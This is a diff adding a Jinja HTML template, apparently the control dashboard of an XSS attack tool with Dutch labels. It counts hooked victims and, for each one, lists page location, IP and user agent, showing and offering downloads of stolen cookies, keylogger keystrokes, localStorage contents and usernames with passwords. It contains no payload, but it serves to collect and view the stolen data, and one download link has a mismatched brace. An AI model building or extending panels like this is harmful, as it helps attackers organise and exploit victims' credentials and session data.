@@ -1,0 +1,29 @@
+
+{{aantalhooked}}
+
+
+
+
+
+
+<h1>Cookies</h1>
+{% for x in cookies: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_cookies/{{x.id}}">[download]</a> <strong>{{x.ip}}</strong> <small>{{x.agent}}</small><pre>{{x.cookies}}</pre></p>
+{% endfor %}
+<h1>Keylogger</h1>
+
+{% for x in keylogger: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_toetsen/{{x.id}}">[download]</a> {{x.ip}} <small>{{x.agent}}</small><pre>{{x.toetsen}}</pre></p>
+{% endfor %}
+<h1>Localstorage</h1>
+{% for x in localstorage: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_localstorage/{{x.id}}">[download]</a> {{x.ip}}  <small>{{x.agent}}</small><pre>{{x.localstorage}}</pre></p>
+{% endfor %}
+<h1>Wachtwoorden</h1>
+{% for x in wachtwoorden: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_creds/{x.id}}">[download]</a> {{x.ip}}  <small>{{x.agent}}</small><pre>{{x.username}}   {{x.password}}</pre></p>
+{% endfor %}
